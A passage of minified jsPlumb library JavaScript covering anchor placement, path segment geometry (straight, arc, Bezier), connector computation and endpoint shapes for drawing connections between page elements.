                          , E = v[D]
                          , F = y.sourceId === a ? 1 : 0;
                        B && !l[z] && (l[z] = {
                            top: [],
                            right: [],
                            bottom: [],
                            left: []
                        }),
                        C && !l[A] && (l[A] = {
                            top: [],
                            right: [],
                            bottom: [],
                            left: []
                        }),
                        a !== A && m.updateOffset({
                            elId: A,
                            timestamp: f
                        }),
                        a !== z && m.updateOffset({
                            elId: z,
                            timestamp: f
                        });
                        var G = m.getCachedData(A)
                          , H = m.getCachedData(z);
                        A === z && (B || C) ? (w(l[z], -Math.PI / 2, 0, y, !1, A, 0, !1, "top", z, q, r),
                        w(l[A], -Math.PI / 2, 0, y, !1, z, 1, !1, "top", A, q, r)) : (E || (E = o(z, A, H.o, G.o, y.endpoints[0].anchor, y.endpoints[1].anchor),
                        v[D] = E),
                        B && w(l[z], E.theta, 0, y, !1, A, 0, !1, E.a[0], z, q, r),
                        C && w(l[A], E.theta2, -1, y, !0, z, 1, !0, E.a[1], A, q, r)),
                        B && b.addWithFunction(s, z, function(a) {
                            return a === z
                        }),
                        C && b.addWithFunction(s, A, function(a) {
                            return a === A
                        }),
                        b.addWithFunction(q, y, function(a) {
                            return a.id === y.id
                        }),
                        (B && 0 === F || C && 1 === F) && b.addWithFunction(r, y.endpoints[F], function(a) {
                            return a.id === y.endpoints[F].id
                        })
                    }
                }
                for (x = 0; x < k.length; x++)
                    0 === k[x].connections.length && k[x].anchor.isContinuous && (l[a] || (l[a] = {
                        top: [],
                        right: [],
                        bottom: [],
                        left: []
                    }),
                    w(l[a], -Math.PI / 2, 0, {
                        endpoints: [k[x], k[x]],
                        paint: function() {}
                    }, !1, a, 0, !1, k[x].anchor.getDefaultFace(), a, q, r),
                    b.addWithFunction(s, a, function(b) {
                        return b === a
                    }));
                for (x = 0; x < s.length; x++)
                    u(s[x], l[s[x]]);
                for (x = 0; x < k.length; x++)
                    k[x].paint({
                        timestamp: f,
                        offset: t,
                        dimensions: t.s,
                        recalc: i !== !0
                    });
                for (x = 0; x < r.length; x++) {
                    var I = m.getCachedData(r[x].elementId);
                    r[x].paint({
                        timestamp: f,
                        offset: I,
                        dimensions: I.s
                    })
                }
                for (x = 0; x < p.length; x++) {
                    var J = p[x][1];
                    if (J.anchor.constructor === c.DynamicAnchor) {
                        J.paint({
                            elementWithPrecedence: a,
                            timestamp: f
                        }),
                        b.addWithFunction(q, p[x][0], function(a) {
                            return a.id === p[x][0].id
                        });
                        for (var K = 0; K < J.connections.length; K++)
                            J.connections[K] !== p[x][0] && b.addWithFunction(q, J.connections[K], function(a) {
                                return a.id === J.connections[K].id
                            })
                    } else
                        J.anchor.constructor === c.Anchor && b.addWithFunction(q, p[x][0], function(a) {
                            return a.id === p[x][0].id
                        })
                }
                var L = n[a];
                for (L && L.paint({
                    timestamp: f,
                    recalc: !1,
                    elId: a
                }),
                x = 0; x < q.length; x++)
                    q[x].paint({
                        elId: a,
                        timestamp: f,
                        recalc: !1,
                        clearEdits: h
                    })
            }
        }
        ;
        var x = function(a) {
            b.EventGenerator.apply(this),
            this.type = "Continuous",
            this.isDynamic = !0,
            this.isContinuous = !0;
            for (var c = a.faces || ["top", "right", "bottom", "left"], d = !(a.clockwise === !1), h = {}, i = {
                top: "bottom",
                right: "left",
                left: "right",
                bottom: "top"
            }, j = {
                top: "right",
                right: "bottom",
                left: "top",
                bottom: "left"
            }, k = {
                top: "left",
                right: "top",
                left: "bottom",
                bottom: "right"
            }, l = d ? j : k, m = d ? k : j, n = a.cssClass || "", o = 0; o < c.length; o++)
                h[c[o]] = !0;
            this.getDefaultFace = function() {
                return 0 === c.length ? "top" : c[0]
            }
            ,
            this.verifyEdge = function(a) {
                return h[a] ? a : h[i[a]] ? i[a] : h[l[a]] ? l[a] : h[m[a]] ? m[a] : a
            }
            ,
            this.isEdgeSupported = function(a) {
                return h[a] === !0
            }
            ,
            this.compute = function(a) {
                return f[a.element.id] || e[a.element.id] || [0, 0]
            }
            ,
            this.getCurrentLocation = function(a) {
                return f[a.element.id] || e[a.element.id] || [0, 0]
            }
            ,
            this.getOrientation = function(a) {
                return g[a.id] || [0, 0]
            }
            ,
            this.clearUserDefinedLocation = function() {
                delete f[a.elementId]
            }
            ,
            this.setUserDefinedLocation = function(b) {
                f[a.elementId] = b
            }
            ,
            this.getCssClass = function() {
                return n
            }
        };
        m.continuousAnchorFactory = {
            get: function(a) {
                return new x(a)
            },
            clear: function(a) {
                delete f[a],
                delete e[a]
            }
        }
    }
    ,
    c.Anchor = function(a) {
        this.x = a.x || 0,
        this.y = a.y || 0,
        this.elementId = a.elementId,
        this.cssClass = a.cssClass || "",
        this.userDefinedLocation = null,
        this.orientation = a.orientation || [0, 0],
        this.lastReturnValue = null,
        this.offsets = a.offsets || [0, 0],
        this.timestamp = null,
        b.EventGenerator.apply(this),
        this.compute = function(a) {
            var b = a.xy
              , c = a.wh
              , d = a.timestamp;
            return a.clearUserDefinedLocation && (this.userDefinedLocation = null),
            d && d === this.timestamp ? this.lastReturnValue : (null != this.userDefinedLocation ? this.lastReturnValue = this.userDefinedLocation : this.lastReturnValue = [b[0] + this.x * c[0] + this.offsets[0], b[1] + this.y * c[1] + this.offsets[1]],
            this.timestamp = d,
            this.lastReturnValue)
        }
        ,
        this.getCurrentLocation = function(a) {
            return a = a || {},
            null == this.lastReturnValue || null != a.timestamp && this.timestamp !== a.timestamp ? this.compute(a) : this.lastReturnValue
        }
    }
    ,
    b.extend(c.Anchor, b.EventGenerator, {
        equals: function(a) {
            if (!a)
                return !1;
            var b = a.getOrientation()
              , c = this.getOrientation();
            return this.x === a.x && this.y === a.y && this.offsets[0] === a.offsets[0] && this.offsets[1] === a.offsets[1] && c[0] === b[0] && c[1] === b[1]
        },
        getUserDefinedLocation: function() {
            return this.userDefinedLocation
        },
        setUserDefinedLocation: function(a) {
            this.userDefinedLocation = a
        },
        clearUserDefinedLocation: function() {
            this.userDefinedLocation = null
        },
        getOrientation: function() {
            return this.orientation
        },
        getCssClass: function() {
            return this.cssClass
        }
    }),
    c.FloatingAnchor = function(a) {
        c.Anchor.apply(this, arguments);
        var b = a.reference
          , d = a.referenceCanvas
          , e = c.getSize(d)
          , f = 0
          , g = 0
          , h = null
          , i = null;
        this.orientation = null,
        this.x = 0,
        this.y = 0,
        this.isFloating = !0,
        this.compute = function(a) {
            var b = a.xy
              , c = [b[0] + e[0] / 2, b[1] + e[1] / 2];
            return i = c,
            c
        }
        ,
        this.getOrientation = function(a) {
            if (h)
                return h;
            var c = b.getOrientation(a);
            return [Math.abs(c[0]) * f * -1, Math.abs(c[1]) * g * -1]
        }
        ,
        this.over = function(a, b) {
            h = a.getOrientation(b)
        }
        ,
        this.out = function() {
            h = null
        }
        ,
        this.getCurrentLocation = function(a) {
            return null == i ? this.compute(a) : i
        }
    }
    ,
    b.extend(c.FloatingAnchor, c.Anchor);
    var d = function(a, b, d) {
        return a.constructor === c.Anchor ? a : b.makeAnchor(a, d, b)
    };
    c.DynamicAnchor = function(a) {
        c.Anchor.apply(this, arguments),
        this.isDynamic = !0,
        this.anchors = [],
        this.elementId = a.elementId,
        this.jsPlumbInstance = a.jsPlumbInstance;
        for (var b = 0; b < a.anchors.length; b++)
            this.anchors[b] = d(a.anchors[b], this.jsPlumbInstance, this.elementId);
        this.getAnchors = function() {
            return this.anchors
        }
        ,
        this.locked = !1;
        var e = this.anchors.length > 0 ? this.anchors[0] : null
          , f = e
          , g = this
          , h = function(a, b, c, d, e) {
            var f = d[0] + a.x * e[0]
              , g = d[1] + a.y * e[1]
              , h = d[0] + e[0] / 2
              , i = d[1] + e[1] / 2;
            return Math.sqrt(Math.pow(b - f, 2) + Math.pow(c - g, 2)) + Math.sqrt(Math.pow(h - f, 2) + Math.pow(i - g, 2))
        }
          , i = a.selector || function(a, b, c, d, e) {
            for (var f = c[0] + d[0] / 2, g = c[1] + d[1] / 2, i = -1, j = 1 / 0, k = 0; k < e.length; k++) {
                var l = h(e[k], f, g, a, b);
                l < j && (i = k + 0,
                j = l)
            }
            return e[i]
        }
        ;
        this.compute = function(a) {
            var b = a.xy
              , c = a.wh
              , d = a.txy
              , h = a.twh;
            this.timestamp = a.timestamp;
            var j = g.getUserDefinedLocation();
            return null != j ? j : this.locked || null == d || null == h ? e.compute(a) : (a.timestamp = null,
            e = i(b, c, d, h, this.anchors),
            this.x = e.x,
            this.y = e.y,
            e !== f && this.fire("anchorChanged", e),
            f = e,
            e.compute(a))
        }
        ,
        this.getCurrentLocation = function(a) {
            return this.getUserDefinedLocation() || (null != e ? e.getCurrentLocation(a) : null)
        }
        ,
        this.getOrientation = function(a) {
            return null != e ? e.getOrientation(a) : [0, 0]
        }
        ,
        this.over = function(a, b) {
            null != e && e.over(a, b)
        }
        ,
        this.out = function() {
            null != e && e.out()
        }
        ,
        this.getCssClass = function() {
            return e && e.getCssClass() || ""
        }
    }
    ,
    b.extend(c.DynamicAnchor, c.Anchor);
    var e = function(a, b, d, e, f, g) {
        c.Anchors[f] = function(c) {
            var h = c.jsPlumbInstance.makeAnchor([a, b, d, e, 0, 0], c.elementId, c.jsPlumbInstance);
            return h.type = f,
            g && g(h, c),
            h
        }
    };
    e(.5, 0, 0, -1, "TopCenter"),
    e(.5, 1, 0, 1, "BottomCenter"),
    e(0, .5, -1, 0, "LeftMiddle"),
    e(1, .5, 1, 0, "RightMiddle"),
    e(.5, 0, 0, -1, "Top"),
    e(.5, 1, 0, 1, "Bottom"),
    e(0, .5, -1, 0, "Left"),
    e(1, .5, 1, 0, "Right"),
    e(.5, .5, 0, 0, "Center"),
    e(1, 0, 0, -1, "TopRight"),
    e(1, 1, 0, 1, "BottomRight"),
    e(0, 0, 0, -1, "TopLeft"),
    e(0, 1, 0, 1, "BottomLeft"),
    c.Defaults.DynamicAnchors = function(a) {
        return a.jsPlumbInstance.makeAnchors(["TopCenter", "RightMiddle", "BottomCenter", "LeftMiddle"], a.elementId, a.jsPlumbInstance)
    }
    ,
    c.Anchors.AutoDefault = function(a) {
        var b = a.jsPlumbInstance.makeDynamicAnchor(c.Defaults.DynamicAnchors(a));
        return b.type = "AutoDefault",
        b
    }
    ;
    var f = function(a, b) {
        c.Anchors[a] = function(c) {
            var d = c.jsPlumbInstance.makeAnchor(["Continuous", {
                faces: b
            }], c.elementId, c.jsPlumbInstance);
            return d.type = a,
            d
        }
    };
    c.Anchors.Continuous = function(a) {
        return a.jsPlumbInstance.continuousAnchorFactory.get(a)
    }
    ,
    f("ContinuousLeft", ["left"]),
    f("ContinuousTop", ["top"]),
    f("ContinuousBottom", ["bottom"]),
    f("ContinuousRight", ["right"]),
    e(0, 0, 0, 0, "Assign", function(a, b) {
        var c = b.position || "Fixed";
        a.positionFinder = c.constructor === String ? b.jsPlumbInstance.AnchorPositionFinders[c] : c,
        a.constructorParams = b
    }),
    a.jsPlumbInstance.prototype.AnchorPositionFinders = {
        Fixed: function(a, b, c) {
            return [(a.left - b.left) / c[0], (a.top - b.top) / c[1]]
        },
        Grid: function(a, b, c, d) {
            var e = a.left - b.left
              , f = a.top - b.top
              , g = c[0] / d.grid[0]
              , h = c[1] / d.grid[1]
              , i = Math.floor(e / g)
              , j = Math.floor(f / h);
            return [(i * g + g / 2) / c[0], (j * h + h / 2) / c[1]]
        }
    },
    c.Anchors.Perimeter = function(a) {
        a = a || {};
        var b = a.anchorCount || 60
          , c = a.shape;
        if (!c)
            throw new Error("no shape supplied to Perimeter Anchor type");
        var d = function() {
            for (var a = .5, c = 2 * Math.PI / b, d = 0, e = [], f = 0; f < b; f++) {
                var g = a + a * Math.sin(d)
                  , h = a + a * Math.cos(d);
                e.push([g, h, 0, 0]),
                d += c
            }
            return e
        }
          , e = function(a) {
            for (var c = b / a.length, d = [], e = function(a, e, f, g, h) {
                c = b * h;
                for (var i = (f - a) / c, j = (g - e) / c, k = 0; k < c; k++)
                    d.push([a + i * k, e + j * k, 0, 0])
            }, f = 0; f < a.length; f++)
                e.apply(null, a[f]);
            return d
        }
          , f = function(a) {
            for (var b = [], c = 0; c < a.length; c++)
                b.push([a[c][0], a[c][1], a[c][2], a[c][3], 1 / a.length]);
            return e(b)
        }
          , g = function() {
            return f([[0, 0, 1, 0], [1, 0, 1, 1], [1, 1, 0, 1], [0, 1, 0, 0]])
        }
          , h = {
            Circle: d,
            Ellipse: d,
            Diamond: function() {
                return f([[.5, 0, 1, .5], [1, .5, .5, 1], [.5, 1, 0, .5], [0, .5, .5, 0]])
            },
            Rectangle: g,
            Square: g,
            Triangle: function() {
                return f([[.5, 0, 1, 1], [1, 1, 0, 1], [0, 1, .5, 0]])
            },
            Path: function(a) {
                for (var b = a.points, c = [], d = 0, f = 0; f < b.length - 1; f++) {
                    var g = Math.sqrt(Math.pow(b[f][2] - b[f][0]) + Math.pow(b[f][3] - b[f][1]));
                    d += g,
                    c.push([b[f][0], b[f][1], b[f + 1][0], b[f + 1][1], g])
                }
                for (var h = 0; h < c.length; h++)
                    c[h][4] = c[h][4] / d;
                return e(c)
            }
        }
          , i = function(a, b) {
            for (var c = [], d = b / 180 * Math.PI, e = 0; e < a.length; e++) {
                var f = a[e][0] - .5
                  , g = a[e][1] - .5;
                c.push([.5 + (f * Math.cos(d) - g * Math.sin(d)), .5 + (f * Math.sin(d) + g * Math.cos(d)), a[e][2], a[e][3]])
            }
            return c
        };
        if (!h[c])
            throw new Error("Shape [" + c + "] is unknown by Perimeter Anchor type");
        var j = h[c](a);
        a.rotation && (j = i(j, a.rotation));
        var k = a.jsPlumbInstance.makeDynamicAnchor(j);
        return k.type = "Perimeter",
        k
    }
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = a.Biltong;
    b.Segments = {
        AbstractSegment: function(a) {
            this.params = a,
            this.findClosestPointOnPath = function(a, b) {
                return {
                    d: 1 / 0,
                    x: null,
                    y: null,
                    l: null
                }
            }
            ,
            this.getBounds = function() {
                return {
                    minX: Math.min(a.x1, a.x2),
                    minY: Math.min(a.y1, a.y2),
                    maxX: Math.max(a.x1, a.x2),
                    maxY: Math.max(a.y1, a.y2)
                }
            }
        },
        Straight: function(a) {
            var c, e, f, g, h, i, j, k = (b.Segments.AbstractSegment.apply(this, arguments),
            function() {
                c = Math.sqrt(Math.pow(h - g, 2) + Math.pow(j - i, 2)),
                e = d.gradient({
                    x: g,
                    y: i
                }, {
                    x: h,
                    y: j
                }),
                f = -1 / e
            }
            );
            this.type = "Straight",
            this.getLength = function() {
                return c
            }
            ,
            this.getGradient = function() {
                return e
            }
            ,
            this.getCoordinates = function() {
                return {
                    x1: g,
                    y1: i,
                    x2: h,
                    y2: j
                }
            }
            ,
            this.setCoordinates = function(a) {
                g = a.x1,
                i = a.y1,
                h = a.x2,
                j = a.y2,
                k()
            }
            ,
            this.setCoordinates({
                x1: a.x1,
                y1: a.y1,
                x2: a.x2,
                y2: a.y2
            }),
            this.getBounds = function() {
                return {
                    minX: Math.min(g, h),
                    minY: Math.min(i, j),
                    maxX: Math.max(g, h),
                    maxY: Math.max(i, j)
                }
            }
            ,
            this.pointOnPath = function(a, b) {
                if (0 !== a || b) {
                    if (1 !== a || b) {
                        var e = b ? a > 0 ? a : c + a : a * c;
                        return d.pointOnLine({
                            x: g,
                            y: i
                        }, {
                            x: h,
                            y: j
                        }, e)
                    }
                    return {
                        x: h,
                        y: j
                    }
                }
                return {
                    x: g,
                    y: i
                }
            }
            ,
            this.gradientAtPoint = function(a) {
                return e
            }
            ,
            this.pointAlongPathFrom = function(a, b, c) {
                var e = this.pointOnPath(a, c)
                  , f = b <= 0 ? {
                    x: g,
                    y: i
                } : {
                    x: h,
                    y: j
                };
                return b <= 0 && Math.abs(b) > 1 && (b *= -1),
                d.pointOnLine(e, f, b)
            }
            ;
            var l = function(a, b, c) {
                return c >= Math.min(a, b) && c <= Math.max(a, b)
            }
              , m = function(a, b, c) {
                return Math.abs(c - a) < Math.abs(c - b) ? a : b
            };
            this.findClosestPointOnPath = function(a, b) {
                var k = {
                    d: 1 / 0,
                    x: null,
                    y: null,
                    l: null,
                    x1: g,
                    x2: h,
                    y1: i,
                    y2: j
                };
                if (0 === e)
                    k.y = i,
                    k.x = l(g, h, a) ? a : m(g, h, a);
                else if (e === 1 / 0 || e === -(1 / 0))
                    k.x = g,
                    k.y = l(i, j, b) ? b : m(i, j, b);
                else {
                    var n = i - e * g
                      , o = b - f * a
                      , p = (o - n) / (e - f)
                      , q = e * p + n;
                    k.x = l(g, h, p) ? p : m(g, h, p),
                    k.y = l(i, j, q) ? q : m(i, j, q)
                }
                var r = d.lineLength([k.x, k.y], [g, i]);
                return k.d = d.lineLength([a, b], [k.x, k.y]),
                k.l = r / c,
                k
            }
        },
        Arc: function(a) {
            var c = (b.Segments.AbstractSegment.apply(this, arguments),
            function(b, c) {
                return d.theta([a.cx, a.cy], [b, c])
            }
            )
              , e = function(a, b) {
                if (a.anticlockwise) {
                    var c = a.startAngle < a.endAngle ? a.startAngle + f : a.startAngle
                      , d = Math.abs(c - a.endAngle);
                    return c - d * b
                }
                var e = a.endAngle < a.startAngle ? a.endAngle + f : a.endAngle
                  , g = Math.abs(e - a.startAngle);
                return a.startAngle + g * b
            }
              , f = 2 * Math.PI;
            this.radius = a.r,
            this.anticlockwise = a.ac,
            this.type = "Arc",
            a.startAngle && a.endAngle ? (this.startAngle = a.startAngle,
            this.endAngle = a.endAngle,
            this.x1 = a.cx + this.radius * Math.cos(a.startAngle),
            this.y1 = a.cy + this.radius * Math.sin(a.startAngle),
            this.x2 = a.cx + this.radius * Math.cos(a.endAngle),
            this.y2 = a.cy + this.radius * Math.sin(a.endAngle)) : (this.startAngle = c(a.x1, a.y1),
            this.endAngle = c(a.x2, a.y2),
            this.x1 = a.x1,
            this.y1 = a.y1,
            this.x2 = a.x2,
            this.y2 = a.y2),
            this.endAngle < 0 && (this.endAngle += f),
            this.startAngle < 0 && (this.startAngle += f);
            var g = this.endAngle < this.startAngle ? this.endAngle + f : this.endAngle;
            this.sweep = Math.abs(g - this.startAngle),
            this.anticlockwise && (this.sweep = f - this.sweep);
            var h = 2 * Math.PI * this.radius
              , i = this.sweep / f
              , j = h * i;
            this.getLength = function() {
                return j
            }
            ,
            this.getBounds = function() {
                return {
                    minX: a.cx - a.r,
                    maxX: a.cx + a.r,
                    minY: a.cy - a.r,
                    maxY: a.cy + a.r
                }
            }
            ;
            var k = 1e-10
              , l = function(a) {
                var b = Math.floor(a)
                  , c = Math.ceil(a);
                return a - b < k ? b : c - a < k ? c : a
            };
            this.pointOnPath = function(b, c) {
                if (0 === b)
                    return {
                        x: this.x1,
                        y: this.y1,
                        theta: this.startAngle
                    };
                if (1 === b)
                    return {
                        x: this.x2,
                        y: this.y2,
                        theta: this.endAngle
                    };
                c && (b /= j);
                var d = e(this, b)
                  , f = a.cx + a.r * Math.cos(d)
                  , g = a.cy + a.r * Math.sin(d);
                return {
                    x: l(f),
                    y: l(g),
                    theta: d
                }
            }
            ,
            this.gradientAtPoint = function(b, c) {
                var e = this.pointOnPath(b, c)
                  , f = d.normal([a.cx, a.cy], [e.x, e.y]);
                return this.anticlockwise || f !== 1 / 0 && f !== -(1 / 0) || (f *= -1),
                f
            }
            ,
            this.pointAlongPathFrom = function(b, c, d) {
                var e = this.pointOnPath(b, d)
                  , f = c / h * 2 * Math.PI
                  , g = this.anticlockwise ? -1 : 1
                  , i = e.theta + g * f
                  , j = a.cx + this.radius * Math.cos(i)
                  , k = a.cy + this.radius * Math.sin(i);
                return {
                    x: j,
                    y: k
                }
            }
        },
        Bezier: function(c) {
            this.curve = [{
                x: c.x1,
                y: c.y1
            }, {
                x: c.cp1x,
                y: c.cp1y
            }, {
                x: c.cp2x,
                y: c.cp2y
            }, {
                x: c.x2,
                y: c.y2
            }];
            b.Segments.AbstractSegment.apply(this, arguments);
            this.bounds = {
                minX: Math.min(c.x1, c.x2, c.cp1x, c.cp2x),
                minY: Math.min(c.y1, c.y2, c.cp1y, c.cp2y),
                maxX: Math.max(c.x1, c.x2, c.cp1x, c.cp2x),
                maxY: Math.max(c.y1, c.y2, c.cp1y, c.cp2y)
            },
            this.type = "Bezier";
            var d = function(b, c, d) {
                return d && (c = a.jsBezier.locationAlongCurveFrom(b, c > 0 ? 0 : 1, c)),
                c
            };
            this.pointOnPath = function(b, c) {
                return b = d(this.curve, b, c),
                a.jsBezier.pointOnCurve(this.curve, b)
            }
            ,
            this.gradientAtPoint = function(b, c) {
                return b = d(this.curve, b, c),
                a.jsBezier.gradientAtPoint(this.curve, b)
            }
            ,
            this.pointAlongPathFrom = function(b, c, e) {
                return b = d(this.curve, b, e),
                a.jsBezier.pointAlongCurveFrom(this.curve, b, c)
            }
            ,
            this.getLength = function() {
                return a.jsBezier.getLength(this.curve)
            }
            ,
            this.getBounds = function() {
                return this.bounds
            }
        }
    },
    b.SegmentRenderer = {
        getPath: function(a) {
            return {
                Straight: function() {
                    var b = a.getCoordinates();
                    return "M " + b.x1 + " " + b.y1 + " L " + b.x2 + " " + b.y2
                },
                Bezier: function() {
                    var b = a.params;
                    return "M " + b.x1 + " " + b.y1 + " C " + b.cp1x + " " + b.cp1y + " " + b.cp2x + " " + b.cp2y + " " + b.x2 + " " + b.y2
                },
                Arc: function() {
                    var b = a.params
                      , c = a.sweep > Math.PI ? 1 : 0
                      , d = a.anticlockwise ? 0 : 1;
                    return "M" + a.x1 + " " + a.y1 + " A " + a.radius + " " + b.r + " 0 " + c + "," + d + " " + a.x2 + " " + a.y2
                }
            }[a.type]()
        }
    };
    var e = function() {
        this.resetBounds = function() {
            this.bounds = {
                minX: 1 / 0,
                minY: 1 / 0,
                maxX: -(1 / 0),
                maxY: -(1 / 0)
            }
        }
        ,
        this.resetBounds()
    };
    b.Connectors.AbstractConnector = function(a) {
        e.apply(this, arguments);
        var f = []
          , g = 0
          , h = []
          , i = []
          , j = a.stub || 0
          , k = c.isArray(j) ? j[0] : j
          , l = c.isArray(j) ? j[1] : j
          , m = a.gap || 0
          , n = c.isArray(m) ? m[0] : m
          , o = c.isArray(m) ? m[1] : m
          , p = null
          , q = !1
          , r = null
          , s = null
          , t = a.editable !== !1 && null != b.ConnectorEditors && null != b.ConnectorEditors[this.type]
          , u = this.setGeometry = function(a, b) {
            q = !b,
            s = a
        }
          , v = this.getGeometry = function() {
            return s
        }
        ;
        this.getPathData = function() {
            for (var a = "", c = 0; c < f.length; c++)
                a += b.SegmentRenderer.getPath(f[c]),
                a += " ";
            return a
        }
        ,
        this.hasBeenEdited = function() {
            return q
        }
        ,
        this.isEditing = function() {
            return null != this.editor && this.editor.isActive()
        }
        ,
        this.setEditable = function(a) {
            return t = !(!a || null == b.ConnectorEditors || null == b.ConnectorEditors[this.type] || null != this.overrideSetEditable && !this.overrideSetEditable()) && a
        }
        ,
        this.isEditable = function() {
            return t
        }
        ,
        this.findSegmentForPoint = function(a, b) {
            for (var c = {
                d: 1 / 0,
                s: null,
                x: null,
                y: null,
                l: null
            }, d = 0; d < f.length; d++) {
                var e = f[d].findClosestPointOnPath(a, b);
                e.d < c.d && (c.d = e.d,
                c.l = e.l,
                c.x = e.x,
                c.y = e.y,
                c.s = f[d],
                c.x1 = e.x1,
                c.x2 = e.x2,
                c.y1 = e.y1,
                c.y2 = e.y2,
                c.index = d)
            }
            return c
        }
        ;
        var w = function() {
            for (var a = 0, b = 0; b < f.length; b++) {
                var c = f[b].getLength();
                i[b] = c / g,
                h[b] = [a, a += c / g]
            }
        }
          , x = function(a, b) {
            b && (a = a > 0 ? a / g : (g + a) / g);
            for (var c = h.length - 1, d = 1, e = 0; e < h.length; e++)
                if (h[e][1] >= a) {
                    c = e,
                    d = 1 === a ? 1 : 0 === a ? 0 : (a - h[e][0]) / i[e];
                    break
                }
            return {
                segment: f[c],
                proportion: d,
                index: c
            }
        }
          , y = function(a, c, d) {
            if (d.x1 !== d.x2 || d.y1 !== d.y2) {
                var e = new b.Segments[c](d);
                f.push(e),
                g += e.getLength(),
                a.updateBounds(e)
            }
        }
          , z = function() {
            g = f.length = h.length = i.length = 0
        };
        this.setSegments = function(a) {
            p = [],
            g = 0;
            for (var b = 0; b < a.length; b++)
                p.push(a[b]),
                g += a[b].getLength()
        }
        ,
        this.getLength = function() {
            return g
        }
        ;
        var A = function(a) {
            this.strokeWidth = a.strokeWidth;
            var b = d.quadrant(a.sourcePos, a.targetPos)
              , c = a.targetPos[0] < a.sourcePos[0]
              , e = a.targetPos[1] < a.sourcePos[1]
              , f = a.strokeWidth || 1
              , g = a.sourceEndpoint.anchor.getOrientation(a.sourceEndpoint)
              , h = a.targetEndpoint.anchor.getOrientation(a.targetEndpoint)
              , i = c ? a.targetPos[0] : a.sourcePos[0]
              , j = e ? a.targetPos[1] : a.sourcePos[1]
              , m = Math.abs(a.targetPos[0] - a.sourcePos[0])
              , p = Math.abs(a.targetPos[1] - a.sourcePos[1]);
            if (0 === g[0] && 0 === g[1] || 0 === h[0] && 0 === h[1]) {
                var q = m > p ? 0 : 1
                  , r = [1, 0][q];
                g = [],
                h = [],
                g[q] = a.sourcePos[q] > a.targetPos[q] ? -1 : 1,
                h[q] = a.sourcePos[q] > a.targetPos[q] ? 1 : -1,
                g[r] = 0,
                h[r] = 0
            }
            var s = c ? m + n * g[0] : n * g[0]
              , t = e ? p + n * g[1] : n * g[1]
              , u = c ? o * h[0] : m + o * h[0]
              , v = e ? o * h[1] : p + o * h[1]
              , w = g[0] * h[0] + g[1] * h[1]
              , x = {
                sx: s,
                sy: t,
                tx: u,
                ty: v,
                lw: f,
                xSpan: Math.abs(u - s),
                ySpan: Math.abs(v - t),
                mx: (s + u) / 2,
                my: (t + v) / 2,
                so: g,
                to: h,
                x: i,
                y: j,
                w: m,
                h: p,
                segment: b,
                startStubX: s + g[0] * k,
                startStubY: t + g[1] * k,
                endStubX: u + h[0] * l,
                endStubY: v + h[1] * l,
                isXGreaterThanStubTimes2: Math.abs(s - u) > k + l,
                isYGreaterThanStubTimes2: Math.abs(t - v) > k + l,
                opposite: w === -1,
                perpendicular: 0 === w,
                orthogonal: 1 === w,
                sourceAxis: 0 === g[0] ? "y" : "x",
                points: [i, j, m, p, s, t, u, v]
            };
            return x.anchorOrientation = x.opposite ? "opposite" : x.orthogonal ? "orthogonal" : "perpendicular",
            x
        };
        this.getSegments = function() {
            return f
        }
        ,
        this.updateBounds = function(a) {
            var b = a.getBounds();
            this.bounds.minX = Math.min(this.bounds.minX, b.minX),
            this.bounds.maxX = Math.max(this.bounds.maxX, b.maxX),
            this.bounds.minY = Math.min(this.bounds.minY, b.minY),
            this.bounds.maxY = Math.max(this.bounds.maxY, b.maxY)
        }
        ;
        return this.pointOnPath = function(a, b) {
            var c = x(a, b);
            return c.segment && c.segment.pointOnPath(c.proportion, !1) || [0, 0]
        }
        ,
        this.gradientAtPoint = function(a, b) {
            var c = x(a, b);
            return c.segment && c.segment.gradientAtPoint(c.proportion, !1) || 0
        }
        ,
        this.pointAlongPathFrom = function(a, b, c) {
            var d = x(a, c);
            return d.segment && d.segment.pointAlongPathFrom(d.proportion, b, !1) || [0, 0]
        }
        ,
        this.compute = function(a) {
            r = A.call(this, a),
            z(),
            this._compute(r, a),
            this.x = r.points[0],
            this.y = r.points[1],
            this.w = r.points[2],
            this.h = r.points[3],
            this.segment = r.segment,
            w()
        }
        ,
        {
            addSegment: y,
            prepareCompute: A,
            sourceStub: k,
            targetStub: l,
            maxStub: Math.max(k, l),
            sourceGap: n,
            targetGap: o,
            maxGap: Math.max(n, o),
            setGeometry: u,
            getGeometry: v
        }
    }
    ,
    c.extend(b.Connectors.AbstractConnector, e),
    b.Endpoints.AbstractEndpoint = function(a) {
        e.apply(this, arguments);
        var b = this.compute = function(a, b, c, d) {
            var e = this._compute.apply(this, arguments);
            return this.x = e[0],
            this.y = e[1],
            this.w = e[2],
            this.h = e[3],
            this.bounds.minX = this.x,
            this.bounds.minY = this.y,
            this.bounds.maxX = this.x + this.w,
            this.bounds.maxY = this.y + this.h,
            e
        }
        ;
        return {
            compute: b,
            cssClass: a.cssClass
        }
    }
    ,
    c.extend(b.Endpoints.AbstractEndpoint, e),
    b.Endpoints.Dot = function(a) {
        this.type = "Dot";
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        a = a || {},
        this.radius = a.radius || 10,
        this.defaultOffset = .5 * this.radius,
        this.defaultInnerRadius = this.radius / 3,
        this._compute = function(a, b, c, d) {
            this.radius = c.radius || this.radius;
            var e = a[0] - this.radius
              , f = a[1] - this.radius
              , g = 2 * this.radius
              , h = 2 * this.radius;
            if (c.stroke) {
                var i = c.strokeWidth || 1;
                e -= i,
                f -= i,
                g += 2 * i,
                h += 2 * i
            }
            return [e, f, g, h, this.radius]
        }
    }
    ,
    c.extend(b.Endpoints.Dot, b.Endpoints.AbstractEndpoint),
    b.Endpoints.Rectangle = function(a) {
        this.type = "Rectangle";
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        a = a || {},
        this.width = a.width || 20,
        this.height = a.height || 20,
        this._compute = function(a, b, c, d) {
            var e = c.width || this.width
              , f = c.height || this.height
              , g = a[0] - e / 2
              , h = a[1] - f / 2;
            return [g, h, e, f]
        }
    }
    ,
    c.extend(b.Endpoints.Rectangle, b.Endpoints.AbstractEndpoint);
    var f = function(a) {
        b.jsPlumbUIComponent.apply(this, arguments),
        this._jsPlumb.displayElements = []
    };
    c.extend(f, b.jsPlumbUIComponent, {
        getDisplayElements: function() {
            return this._jsPlumb.displayElements
        },
        appendDisplayElement: function(a) {
            this._jsPlumb.displayElements.push(a)
        }
    }),
    b.Endpoints.Image = function(d) {
        this.type = "Image",
        f.apply(this, arguments),
